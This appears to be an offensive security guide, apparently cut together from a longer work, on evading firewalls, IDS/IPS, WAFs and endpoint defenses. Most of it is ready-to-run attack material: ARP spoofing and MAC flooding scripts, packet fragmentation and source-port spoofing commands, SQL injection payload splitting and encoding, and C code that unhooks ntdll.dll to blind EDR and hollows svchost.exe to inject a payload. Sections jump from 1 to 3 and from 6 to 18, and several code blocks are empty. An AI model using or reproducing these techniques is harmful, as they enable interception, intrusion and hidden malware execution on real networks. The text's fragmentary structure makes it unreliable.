# PART 1: FOUNDATIONS — HOW DEFENSES WORK

Understanding the enemy's tools is the first step to evading them.

## 1.1 Firewall Types & How They Inspect Traffic

| Type | How It Works | Weakness to Exploit |
|---|---|---|
| **Packet-Filtering (Stateless)** | Filters based on header (src/dst IP, port, protocol). No memory of connections. | Fragmentation, spoofing, ambiguous packets. |
| **Stateful Firewall** | Tracks connection state (SYN, ESTABLISHED, etc.). | Protocol confusion, tunneling in established flows, fragmentation. |
| **Application Layer Firewall (ALFW / Proxy)** | Parses application protocols (HTTP, DNS, etc.). | Encoding, protocol manipulation, encryption, HTTP verb abuse. |
| **Next-Gen Firewall (NGFW)** | DPI (Deep Packet Inspection), SSL inspection, threat feeds. | Encryption (TLS 1.3), domain fronting, custom protocols, fragmentation before reassembly. |
| **Web Application Firewall (WAF)** | Signature + anomaly rules on HTTP. | Encoding, case tricks, payload mutation, chunked encoding. |

## 1.2 IDS/IPS Detection Mechanisms

**IDS** = Intrusion Detection System (alerts only)  
**IPS** = Intrusion Prevention System (blocks inline)

Detection methods you must evade:

1. **Signature-Based**
   - Matches known patterns (regex, byte sequences).
   - *Evasion:* Encode, fragment, mutate payload.

2. **Anomaly-Based / Statistical**
   - Baselines "normal" traffic, flags deviations.
   - *Evasion:* Mimic normal traffic patterns, use low-and-slow.

3. **Protocol Anomaly**
   - Checks protocol compliance (RFC violations).
   - *Evasion:* Use valid-looking but unusual protocol constructs.

4. **Heuristic / ML-Based**
   - Behavioral analysis, entropy checks.
   - *Evasion:* Reduce entropy signals, use legitimate channels.

## 1.3 The Defense Stack You're Fighting

```
Internet
   │
   ├── WAF (HTTP inspection)
   │
   ├── IDS/IPS (Snort, Suricata, Zeek)
   │
   ├── Firewall (iptables, pf, NGFW)
   │
   ├── Proxy (Squid, Bluecoat, corporate gateway)
   │
   ├── Endpoint Protection (EDR, AV)
   │
   └── Internal segmentation
```

Every layer requires a different technique.


```bash

```

**Key insight:** The firewall's ALLOW list is your egress path of choice.

# PART 3: NETWORK-LEVEL ATTACKS & EVASION

These are Layer 2/3 attacks that enable MITM, credential capture, and network positioning — all while avoiding detection.

## 3.1 ARP Spoofing / ARP Cache Poisoning

ARP has no authentication. Any host can claim to own any IP.

```bash
# arpspoof (dsniff suite)
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1    # Tell victim gateway is at our MAC
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5    # Tell gateway victim is at our MAC

# Ettercap (GUI/TUI)
ettercap -T -M arp /10.0.0.5// /10.0.0.1//

# Bettercap
bettercap -iface eth0
> set arp.spoof.targets 10.0.0.5
> arp.spoof on
> net.sniff on

# Scapy ARP spoofing
from scapy.all import *
import time

def arp_spoof(target_ip, spoof_ip, iface="eth0"):
    target_mac = getmacbyip(target_ip)
    attacker_mac = get_if_hwaddr(iface)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    while True:
        send(pkt, verbose=False)
        time.sleep(2)

arp_spoof("10.0.0.5", "10.0.0.1")
```


## 3.2 MAC Flooding (CAM Table Overflow)

Overwhelm switch CAM table so it falls back to hub-like behavior (floods all ports).

```bash
# macof (dsniff) — floods random MAC addresses

# Yersinia (Layer 2 attack framework)
sudo yersinia macof -i eth0

# Bettercap
> macflooding.flood on

# Scapy MAC flood
from scapy.all import *
import random

def mac_flood(iface="eth0"):
    while True:
        pkt = ARP()
        pkt.hwsrc = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
        pkt.psrc = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        pkt.hwdst = "ff:ff:ff:ff:ff:ff"
        pkt.pdst = "10.0.0.1"
        sendp(pkt, iface=iface, verbose=False)

mac_flood()
```


# PART 4: FIREWALL EVASION

## 4.1 Understanding Firewall Rules

Firewall rules are typically:
```
allow tcp from any to any port 80
allow tcp from any to any port 443
deny  ip from any to any
```

**Evasion principle:** Find the gap in what's allowed, or craft packets that match the ALLOW rule but carry your payload.

## 4.2 IP Fragmentation

Break packets into small fragments. Stateless firewalls may only inspect the first fragment.

```bash
# Nmap fragmented packets
nmap -f target.com          # Split into 8-byte fragments
nmap -ff target.com         # Split into 16-byte fragments

# Hping3 fragmentation
hping3 -f -V -p 80 target.com
hping3 -f -V -p 80 --udp target.com

# Scapy fragmentation
from scapy.all import *
ip = IP(dst="target")
tcp = TCP(dport=80, flags="S")
frag = fragment(ip/tcp, 8)
send(frag)
```

**How it works:**
- First fragment contains TCP header (ports, flags).
- Later fragments contain payload.
- Stateful firewalls reassemble; stateless do not.
- IDS might only inspect first fragment.

## 4.3 MTU-Based Fragmentation

```bash
# Set low MTU to force fragmentation
# Linux: use iptables TTL + fragmentation
iptables -A FORWARD -p tcp --dport 80 -j TCPMSS --set-mss 128

# Manually with Scapy
packet = IP(dst="target")/TCP(dport=80, flags="S")
send(fragment(packet, 8))
```

## 4.4 Source Port Manipulation

Firewalls sometimes trust certain source ports (like 53, 80, 443).

```bash
# Hping3: spoof source port to trusted port
hping3 -S -p 80 -s 53 target.com        # Source port 53 (DNS)
hping3 -S -p 80 -s 80 target.com        # Source port 80 (HTTP)
hping3 -S -p 443 -s 443 target.com      # Source port 443 (HTTPS)

# Nmap source port
nmap -g 53 -p 80 target.com             # Spoof source port 53
nmap -g 80 -p 8080 target.com
```

## 4.5 Protocol Mismatch

Send traffic on an unexpected protocol/port.

```bash
# Send HTTP over ICMP
hping3 -1 -E "GET / HTTP/1.1" target.com

# Send TCP on unusual ports
hping3 -S -p 31337 -c 1 target.com

# Send data over DNS to bypass port blocks
# (see tunneling section)
```

## 4.6 Idle / Zombie Scan

Use a third-party "zombie" host to scan, hiding your real IP.

```bash
# Find a zombie host with incremental IP ID
nmap -sI zombie-host target.com -p 1-1000

# Or manually with hping3
# Step 1: Check zombie IP ID
hping3 -S -p 445 -c 1 zombie-host

# Step 2: Spoof packet from zombie to target
hping3 -S -p 80 -a zombie-host -c 1 target.com

# Step 3: Check zombie IP ID increment
hping3 -S -p 445 -c 1 zombie-host
```

## 4.7 Decoy Scanning

Send packets from multiple spoofed IPs alongside your real IP.

```bash
# Nmap decoy scan
nmap -D RND,ME,10.0.0.1,10.0.0.2 target.com
nmap -D decoy1,decoy2,ME,decoy3 -p 80 target.com

# Use real-looking IPs
nmap -D 10.0.0.1,10.0.0.2,ME,192.168.1.1 -p 80 target.com
```

**OPSEC note:** Decoy IPs must be UP, or the target may send RST to your real IP.

# PART 5: IDS/IPS EVASION

## 5.1 Understanding IDS Rules

IDS rules look like:
```
alert tcp any any -> $HOME_NET 80 (
    msg:"SQL Injection Attempt";
    content:"UNION SELECT";
    sid:100001;
)
```

**To evade:**
- Don't send the literal `UNION SELECT` in one packet.
- Fragment or encode it.
- Split across multiple packets.

## 5.2 Session Splicing

Split attack payload across multiple packets, each evading signature.

```bash
# Send payload byte by byte
# Using Scapy
from scapy.all import *
import time

payload = "UNION SELECT password FROM users"
for i, byte in enumerate(payload):
    pkt = IP(dst="target")/TCP(dport=80, flags="A", seq=1000+i)/Raw(load=byte)
    send(pkt)
    time.sleep(0.1)  # Time-based evasion
```

## 5.3 Timing-Based Evasion

Slow down traffic to evade rate-based detection.

```bash
# Nmap timing
nmap -T0 -p 80 target.com         # Paranoid timing (very slow)
nmap -T1 -p 80 target.com         # Sneaky
nmap --max-rate 1 -p 80 target.com # 1 packet/second

# Hping3 delay
hping3 -S -p 80 --delay 1000 target.com  # 1 second delay

# Custom slow sending with Scapy
from scapy.all import *
import time
for i in range(100):
    pkt = IP(dst="target")/TCP(dport=80, flags="S", seq=i)
    send(pkt)
    time.sleep(1)  # 1 second between packets
```

## 5.4 Payload Encoding / Obfuscation

```bash
# URL encoding
# UNION SELECT → %55%4E%49%4F%4E%20%53%45%4C%45%43%54

# Double encoding
# UNION → %2555%254E%2549%254F%254E

# Unicode encoding
# UNION → u0055 u004E u0049 u004F u004E

# Hex encoding
# UNION SELECT → 0x554E494F4E2053454C454354

# Base64
# UNION SELECT → VU5PTiBTRUxFQ1Q=

# Mixed case
# uNiOn SeLeCt

# Comment injection
# UN/**/ION SEL/**/ECT

# Add whitespace / null bytes
# UNION%00SELECT
```

**Tool: Cloakify**
```bash
# Cloakify: transform payloads into benign-looking text
cloakify -i payload.txt -c base64.txt
cloakify -i payload.txt -c emoji.txt
cloakify -i payload.txt -c weather.txt
```

## 5.5 Fragmentation + Overlapping Packets

Send overlapping fragments to confuse reassembly.

```bash
# Scapy overlapping fragments
from scapy.all import *

ip = IP(dst="target")
tcp = TCP(dport=80, flags="S")
payload = Raw(load="ATTACK_PAYLOAD")

# Normal fragment
frag1 = fragment(ip/tcp/payload, 8)

# Send fragments with different offsets (overlapping)
for pkt in frag1:
    send(pkt)

# Overlapping: send same data twice with different offsets
# IDS may see one thing, firewall another
```

## 5.6 TTL-Based Evasion

Firewalls and IDS may see different packets based on TTL.

```bash
# Send packet with TTL that expires at firewall
# but not at IDS (or vice versa)
# Depends on network topology (hop count)

# Scapy TTL manipulation
from scapy.all import *

# TTL = 5: dies at 5 hops
pkt1 = IP(dst="target", ttl=5)/TCP(dport=80, flags="S")/Raw(load="malicious")
send(pkt1)

# TTL = 64: reaches target
pkt2 = IP(dst="target", ttl=64)/TCP(dport=80, flags="A")/Raw(load="payload")
send(pkt2)
```

## 5.7 IP Options Manipulation


# PART 6: WAF (WEB APPLICATION FIREWALL) EVASION

## 6.1 Understanding WAF Signatures

WAFs look for:
- SQL keywords: `SELECT`, `UNION`, `INSERT`, `OR 1=1`
- XSS patterns: `<script>`, `onerror=`, `javascript:`
- Path traversal: `../`, `..%2f`, `....//`
- Command injection: `;ls`, `|whoami`, `` `id` ``

## 6.2 HTTP Method Manipulation

```bash

curl -X PATCH "https://target.com/page"
curl -X DELETE "https://target.com/page"
```

## 18.2 Unhooking ntdll.dll

```c
// Copy clean ntdll.dll from disk, overwrite hooked version in memory
#include <windows.h>

void UnhookNtdll() {
    // 1. Map clean ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID pCleanNtdll = VirtualAlloc(NULL, fileSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, pCleanNtdll, fileSize, &bytesRead, NULL);

    // 2. Find ntdll.dll in memory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // 3. Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNtHeaders =
        (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDosHeader->e_lfanew);

    // 4. Find .text section
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            // 5. Copy clean .text section over hooked version
            DWORD oldProtect;
            VirtualProtect((BYTE*)hNtdll + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);

            memcpy((BYTE*)hNtdll + pSection[i].VirtualAddress,
                (BYTE*)pCleanNtdll + pSection[i].PointerToRawData,
                pSection[i].Misc.VirtualSize);

            VirtualProtect((BYTE*)hNtdll + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
}
```

## 18.6 Process Hollowing

```c
// Hollow out a legitimate process, inject payload
#include <windows.h>

void ProcessHollowing(LPVOID payload, SIZE_T payloadSize) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    // 1. Create suspended process
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL,
        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 2. Get process context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // 3. Get PEB address (RDX on x64)
    LPVOID pPeb = (LPVOID)ctx.Rdx;

    // 4. Read ImageBaseAddress from PEB
    LPVOID pImageBase = NULL;
    ReadProcessMemory(pi.hProcess, (BYTE*)pPeb + 0x10,
        &pImageBase, sizeof(LPVOID), NULL);

    // 5. Unmap original code
    NtUnmapViewOfSection(pi.hProcess, pImageBase);

    // 6. Allocate new memory
    LPVOID pNewImageBase = VirtualAllocEx(pi.hProcess, pImageBase,
        payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 7. Write payload
    WriteProcessMemory(pi.hProcess, pNewImageBase, payload,
        payloadSize, NULL);

    // 8. Update PEB ImageBaseAddress
    WriteProcessMemory(pi.hProcess, (BYTE*)pPeb + 0x10,
        &pNewImageBase, sizeof(LPVOID), NULL);

    // 9. Update thread context to payload entry point
    ctx.Rcx = (DWORD64)pNewImageBase;  // x64 entry point in RCX
    SetThreadContext(pi.hThread, &ctx);

    // 10. Resume thread
    ResumeThread(pi.hThread);
}
```

Sandboxes are automated analysis environments (Any.Run, Joe Sandbox, Hybrid Analysis, Cuckoo, VMRay, CrowdStrike, Microsoft Defender sandbox) that detonate payloads to determine if they are malicious. Evading them is critical for payload delivery in red team engagements.

### 19.4.1 Debugger Detection
